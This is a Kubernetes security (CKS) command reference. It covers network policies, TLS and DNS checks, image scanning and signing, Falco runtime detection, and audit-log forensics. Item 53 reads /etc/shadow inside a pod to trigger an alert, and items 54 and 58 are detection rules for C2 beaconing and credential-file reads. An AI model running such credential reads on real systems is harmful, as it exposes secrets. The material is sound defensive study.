CKS: Service debug
35Block Metadata Endpoint (IMDS)
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: block-imds, namespace: ns}
spec:
  podSelector: {}
  policyTypes: [Egress]
  egress:
  - to: [{ipBlock: {cidr: 0.0.0.0/0, except: [169.254.169.254/32]}}]
EOF
Prevent pods from accessing cloud metadata service (AWS 169.254.169.254). Critical cloud security control.
CKS: IMDS block
36Allow DNS Egress to CoreDNS
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: allow-dns, namespace: ns}
spec:
  podSelector: {}
  policyTypes: [Egress]
  egress:
  - to: [{namespaceSelector: {matchLabels: {kubernetes.io/metadata.name: kube-system}}, podSelector: {matchLabels: {k8s-app: kube-dns}}}]
    ports: [{protocol: UDP, port: 53}, {protocol: TCP, port: 53}]
EOF
Allow DNS resolution through CoreDNS. Must-have rule when using default-deny egress policies.
CKS: DNS allow
37kubectl get ingress -A
kubectl get ingress -A
kubectl describe ingress anihpj-api -n ns
List and inspect Ingress resources. Verify TLS configuration, host rules, backend services.
CKS: Ingress audit
38openssl s_client — Test TLS
openssl s_client -connect host:443 -servername host
echo | openssl s_client -connect host:443 2>/dev/null | openssl x509 -noout -dates
Verify TLS certificate chain, expiration dates, and hostname matching from outside the cluster.
CKS: TLS validation
39curl -kv — Test TLS from Inside
kubectl exec deploy/anihpj-api -- curl -kv https://anihpj-api.jobpost.com
kubectl exec deploy/anihpj-api -- curl -k https://10.0.0.5:443
Test TLS connectivity from within a pod. Verify certificate hostname matches, no VERIFY_ERROR.
CKS: Internal TLS test
40nslookup / dig from BusyBox
kubectl run dns-test --rm -it --image=busybox -- nslookup kubernetes.default
kubectl exec deploy/anihpj-api -- nslookup anihpj-db.anihpj-prod.svc.cluster.local
Verify DNS resolution works. DNS failures often caused by NetworkPolicy blocking UDP 53 to CoreDNS.
CKS: DNS debugging
B.5 Image Security & Vulnerability Scanning Commands 41–50
CMDCommandWhat It DoesCKS Use
41trivy image python:3.12-slimScan container image for known CVEs. Reports CRITICAL/HIGH/MEDIUM/LOW with CVE IDs.Vuln scanning
42trivy image --severity CRITICAL,HIGH python:3.12-slimFilter scan to only CRITICAL+HIGH. Reduces noise in CI/CD pipeline gating.CI gate
43trivy image --format json -o report.json python:3.12-slimExport scan as JSON for pipeline integration. Machine-readable for compliance reporting.Automation

45kubectl set image deploy/anihpj-api *=python:3.12-slim@sha256:abc123Update Deployment to use digest-pinned image. Eliminates :latest ambiguity.Deploy update
46cosign sign --key cosign.key myimage:tagSign container image with private key. Enables ImagePolicyWebhook verification.Image signing
47cosign verify --key cosign.pub myimage:tagVerify image signature before deployment. Block unsigned/deceptively-signed images.Sig verification
48syft python:3.12-slim -o spdx-json > sbom.jsonGenerate Software Bill of Materials. Know every package in your image for CVE impact analysis.SBOM gen
49grype sbom:sbom.jsonScan SBOM for vulnerabilities. Faster than image scanning — can be run offline.SBOM scanning
50docker history myimage:tag --no-truncShow image layer history. Find secrets leaked in layers, unnecessary build artifacts.Layer audit

B.6 Runtime Security & Falco Commands 51–60
51helm install falco falcosecurity/falco
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco --namespace falco --create-namespace \
  --set falco.driver.kind=ebpf
Install Falco via Helm. Use eBPF driver (no kernel module compile). Creates falco namespace + DaemonSet.
CKS: Falco install
52kubectl logs -l app=falco -n falco
kubectl logs -l app=falco -n falco -f
kubectl logs -l app=falco -n falco --tail=100 | grep -i error
Stream Falco alerts in real-time. Follow (-f) during security testing. Each line = a detected event.
CKS: Alert monitoring
53Trigger Falco Alert — Test Rules
# Terminal 1: kubectl logs -l app=falco -n falco -f
# Terminal 2:
kubectl exec deploy/anihpj-api -- sh -c "cat /etc/shadow"
# Expected: Falco alert "Read sensitive file untrusted"
Test that Falco is detecting threats. Run a known-bad command and verify alert fires.
CKS: Rule testing
54Create Custom Falco Rule
cat > /etc/falco/custom-rules.yaml <<EOF
- rule: Detect C2 Beaconing
  desc: Outbound connection to non-standard port every 30 min
  condition: evt.type=connect and fd.sport > 50000 and fd.sip != "10.0.0.0/8"
  output: "C2 beacon detected (ip=%fd.sip port=%fd.sport container=%container.name)"
  priority: CRITICAL
  tags: [network, c2, beacon]
EOF
Write custom detection rules for CKS scenarios. Falco rules use sysdig filtering syntax.
CKS: Custom rules
55falco --list=fields
falco --list=fields | grep -i fd
falco --list=fields | grep -i container
falco --list=fields | grep -i proc
List all available Falco filter fields. Essential for writing custom rules.
CKS: Rule authoring
56Falcosidekick — Alert Routing
helm upgrade falco falcosecurity/falco -n falco \
  --set falcosidekick.enabled=true \
  --set falcosidekick.config.slack.webhookurl="https://hooks.slack.com/..."
Enable Falcosidekick for alert routing to Slack, PagerDuty, OpsGenie. Critical for incident response.
CKS: Alert routing
57falco-driver-loader — eBPF Probe
falco-driver-loader bpf
# Verify: ls -la /root/.falco/falco-bpf.o
# Fallback: falco-driver-loader kmod (kernel module)
Load Falco eBPF probe. Preferred over kernel module — no compilation, no kernel version dependency.
CKS: Driver setup
58Falco Rule: Read Sensitive File
- rule: Read sensitive file untrusted
  desc: an attempt to read any sensitive file
  condition: open_read and sensitive_files and not trusted_programs
  output: "Sensitive file opened (file=%fd.name user=%user.name)"
  priority: WARNING
  tags: [filesystem, mitre_credential_access]
Built-in Falco rule. Catches /etc/shadow, /proc/self/environ, kubeconfig reads. Most common CKS alert.
CKS: Credential detection
59Isolate Compromised Pod — NetworkPolicy
kubectl label pod compromised-pod quarantine=true -n ns
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: quarantine-pod, namespace: ns}
spec:
  podSelector: {matchLabels: {quarantine: "true"}}
  policyTypes: [Ingress, Egress]
EOF
Instantly isolate a compromised pod (no ingress, no egress). First step in incident response.
CKS: IR isolation
60kubectl cordon & drain — Node Isolation
kubectl cordon anih-wk1
kubectl drain anih-wk1 --ignore-daemonsets --delete-emptydir-data
kubectl uncordon anih-wk1  # After remediation
Cordon = no new pods. Drain = evict all pods. Use when a node is compromised.
CKS: Node isolation
B.7 Audit Logging & Monitoring Commands 61–70
CMDCommandWhat It DoesCKS Use
61cat /etc/kubernetes/audit-policy.yamlView the active audit policy. Defines WHAT gets logged and at WHAT level.Policy review
62tail -f /var/log/kubernetes/audit.log | jq .Stream audit logs in real-time. Pipe through jq for readable JSON formatting.Log monitoring
63cat /var/log/kubernetes/audit.log | jq 'select(.verb=="delete") | {user:.user.username, resource:.objectRef.resource, name:.objectRef.name, time:.stageTimestamp}'Filter audit log for DELETE operations. Find who deleted what and when.Forensics
64cat audit.log | jq 'select(.responseStatus.code>=400)'Find all failed/denied API requests. RBAC denials, admission rejections, invalid requests.Error audit
65kubectl get --raw /metrics | grep auditGet API server audit metrics. Check if audit logging is actually writing events.Audit health
66logrotate -d /etc/logrotate.d/kubernetes-auditDry-run audit log rotation. Verify rotation config prevents disk exhaustion.Log rotation
67du -sh /var/log/kubernetes/audit*Check audit log disk usage. Audit logs grow fast — monitor or risk node disk pressure.Disk monitoring
